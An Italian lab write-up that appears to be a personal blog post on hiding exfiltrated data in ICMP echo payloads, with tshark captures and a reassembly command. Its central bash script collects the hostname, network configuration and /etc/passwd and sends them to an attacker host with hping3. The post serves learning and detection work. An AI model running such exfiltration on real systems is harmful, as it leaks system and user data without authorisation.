# Esfiltrare dati tramite ICMP

## Contesto

Uno degli obiettivi di un attaccante è quello di esfiltrare dati dall'host sotto attacco, dati che possono riguardare il sistema (cose come configurazione IP, lista degli utenti, informazioni sull'ambiente di rete, ecc...) oppure possono essere dati veri e propri; in tutti i casi, è interesse dell'attaccante poter esfiltrare dati verso l'esterno senza essere notato, e usando un protocollo standard che non sia bloccato dai firewall.

Uno dei tanti metodi a disposizione consiste nello sfruttare un protocollo di rete come ICMP, sostituendo il payload di un pacchetto standard ICMP con i dati che vogliamo esfiltrare da un sistema precedentemente compromesso.

In questo articolo vedremo alcuni test, in cui abbiamo due host: A è la macchina compromessa, mentre B rappresenta l'attaccante:

- A: 172.31.250.2
- B: 172.31.250.10

## Analisi del payload di un normale pacchetto ICMP

Un normale pacchetto ICMP consiste in un semplice comando ping, in cui si ha una richiesta (request) e, quando l'host è raggiungibile, una risposta (response), proviamo quindi ad analizzare request e response ICMP, facendo un ping dall'host A all'host B, catturando il traffico di rete sull'host B; dalla cattura, visualizziamo da riga di comando il payload della request ICMP con questo comando di tshark:

~~~shell
tshark -r /vagrant/icmp.pcapng -x -Y 'icmp.type == 8'
~~~

con il quale otteniamo questo output

~~~shell
0000  08 00 27 0a 6c 9f 08 00 27 c9 19 f8 08 00 45 00   ..'.l...'.....E.
0010  00 54 ec 86 40 00 40 01 01 d6 ac 1f fa 02 ac 1f   .T..@.@.........
0020  fa 0a 08 00 87 8c 00 01 00 01 8b 19 ea 64 00 00   .............d..
0030  00 00 35 20 07 00 00 00 00 00 10 11 12 13 14 15   ..5 ............
0040  16 17 18 19 1a 1b 1c 1d 1e 1f 20 21 22 23 24 25   .......... !"#$%
0050  26 27 28 29 2a 2b 2c 2d 2e 2f 30 31 32 33 34 35   &'()*+,-./012345
0060  36 37                                             67
~~~

che rappresenta il pacchetto completo della richiesta ICMP, mentre il payload è ciò che è rappresentato, sulla colonna di destra, dal numero 5 fino al termine del pacchetto, o in esadecimale, dalla posizione 35 20, come possiamo vedere sempre con tshark:

~~~shell
tshark -r /vagrant/icmp.pcapng -Y 'icmp.type == 8' -T fields -e data.data
~~~

dal quale otteniamo questo output, che ci mostra il payload in esadecimale della nostra richiesta ICMP

~~~shell
3520070000000000101112131415161718191a1b1c1d1e1f202122232425262728292a2b2c2d2e2f3031323334353637
~~~

**N.B.** Questo è il payload ICMP su Ubuntu, il payload su Windows è diverso, anche se ai fini dell'argomento trattato è ininfluente.

## Modifica del payload di un pacchetto ICMP e analisi di rete

Ora proveremo a simulare l'esfiltrazione di dati da una macchina compromessa, raccogliendo alcune informazioni come il nome host, la configurazione IP, le route e la lista degli utenti del sistema, quindi queste informazioni verranno trasferite tramite ICMP per mezzo dell'utility hping3, un tool che permette di fare tantissime cose a livello di networking, e che in questo caso sfrutteremo per trasferire le informazioni dall'host A all'host B; tutto ciò verrà eseguito tramite lo script seguente:

~~~shell
#!/bin/bash

echo "=========HOSTNAME=========" > /tmp/data.txt
hostname >> /tmp/data.txt
echo "=========CONFIGURAZIONE IP=========" >> /tmp/data.txt
ip a >> /tmp/data.txt
echo "=========LISTA ROUTE=========" >> /tmp/data.txt
ip r >> /tmp/data.txt
echo "=========LISTA UTENTI=========" >> /tmp/data.txt
cat /etc/passwd >> /tmp/data.txt

hping3 -1 -E /tmp/data.txt -u -d 150 -c 30 172.31.250.10
~~~

Lo script in breve: vengono lanciati alcuni comandi il cui output viene rediretto verso il file /tmp/data.txt, quindi viene eseguito il comando hping3, in cui l'opzione -1 indica l'utilizzo del protocollo ICMP, l'opzione -E prende il contenuto del file /tmp/data.txt e lo utilizza come payload dei vari pacchetti ICMP, -d indica la lunghezza del payload di ogni pacchetto, mentre l'opzione -c rappresenta il numero di pacchetti ICMP inviati, nel mio caso ho scelto 30 in modo del tutto arbitrario.

Come nell'esempio precedente, andrò ad analizzare il traffico di rete; per prima cosa, andremo di nuovo a visualizzare il payload dei pacchetti con il comando

~~~shell
tshark -r /vagrant/icmp.pcapng -x -Y 'icmp.type == 8'
~~~

di cui viene riportato l'output del primo pacchetto

~~~shell
0000  08 00 27 0a 6c 9f 08 00 27 c9 19 f8 08 00 45 00   ..'.l...'.....E.
0010  00 b2 53 4b 00 00 40 01 da b3 ac 1f fa 02 ac 1f   ..SK..@.........
0020  fa 0a 08 00 a7 8a 9b 09 00 00 3d 3d 3d 3d 3d 3d   ..........======
0030  3d 3d 3d 48 4f 53 54 4e 41 4d 45 3d 3d 3d 3d 3d   ===HOSTNAME=====
0040  3d 3d 3d 3d 0a 6d 61 6c 77 61 72 65 2d 61 6e 61   ====.network-ana
0050  6c 79 73 69 73 0a 3d 3d 3d 3d 3d 3d 3d 3d 3d 43   lysis.=========C
0060  4f 4e 46 49 47 55 52 41 5a 49 4f 4e 45 20 49 50   ONFIGURAZIONE IP
0070  3d 3d 3d 3d 3d 3d 3d 3d 3d 0a 31 3a 20 6c 6f 3a   =========.1: lo:
0080  20 3c 4c 4f 4f 50 42 41 43 4b 2c 55 50 2c 4c 4f    <LOOPBACK,UP,LO
0090  57 45 52 5f 55 50 3e 20 6d 74 75 20 36 35 35 33   WER_UP> mtu 6553
00a0  36 20 71 64 69 73 63 20 6e 6f 71 75 65 75 65 20   6 qdisc noqueue
00b0  73 74 61 74 65 20 55 4e 4b 4e 4f 57 4e 20 67 72   state UNKNOWN gr
~~~

Come si può vedere, ora il payload è più grande (parametro -d del comando hping3), e soprattutto contiene la prima parte delle informazioni raccolte sull'host compromesso. Ma se volessi ricostruire tutte le informazioni inviate con hping3? Con tshark e utilizzando sed, la cosa è piuttosto semplice, basta usare un comando come il seguente

~~~shell
tshark -r /vagrant/icmp.pcapng -Y 'icmp.type == 8' -o data.show_as_text:TRUE -T fields -e data.text | sed 's/\\n/\n/g' | sed '/^$/d'
~~~

per ottenere questo output (l'output è tagliato altrimenti sarebbe troppo lungo)

~~~shell
=========HOSTNAME=========
network-analysis
=========CONFIGURAZIONE IP=========
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN gr
oup default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_
lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc f
q_codel state UP group default qlen 1000
    link/ether 02:2d:ad:11:22:33 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 metric 100 brd 10.0.2.255 scope
global dynamic enp0s3
       valid_lft 85108sec preferred_lft 85108sec
    inet6 fe80::2d:adff:fe54:38ca/64 scope link
       valid_lft forever prefe
rred_lft forever
3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:11:22:3
3 brd ff:ff:ff:ff:ff:ff
    inet 172.31.250.2/24 brd 172.31.250.255 scope global enp0s8
       valid_lft forever preferred_lft forever
    inet6 fe80:
:a00:27ff:fec9:19f8/64 scope link
       valid_lft forever preferred_lft forever
~~~

Come si può notare, l'output non è perfetto, ma è senz'altro adatto allo scopo. Da notare inoltre le opzioni utilizzate con il comando tshark: per prima cosa viene specificato un display filter che ci consente di ottenere solo le request ICMP (opzione -Y 'icmp.type == 8'), quindi abbiamo l'opzione -o data.show_as_text:TRUE che ci consente di visualizzare il payload in formato testo, infine scegliamo di mostrare solo il campo data (cioé il payload) in formato testo (opzione -e data.text), successivamente utilizziamo il comando sed per formattare il testo nel modo più opportuno.

## AVVERTENZE

Questa è sostanzialmente una simulazione fatta su un mio lab privato, fatta per chiarirmi le idee su questi argomenti, nel mondo reale, si usano altri strumenti e tecniche, come ICMP tunneling, sia per esfiltrare dati sia per far comunicare l'host infetto con l'attaccante, in modo che quest'ultimo possa lanciare comandi sul sistema compromesso (command and control, o C2). 

Usare queste tecniche su sistemi che non si amministra o per cui non si è ricevuta un'autorizzazione rappresenta un reato, per cui, attenzione, sempre.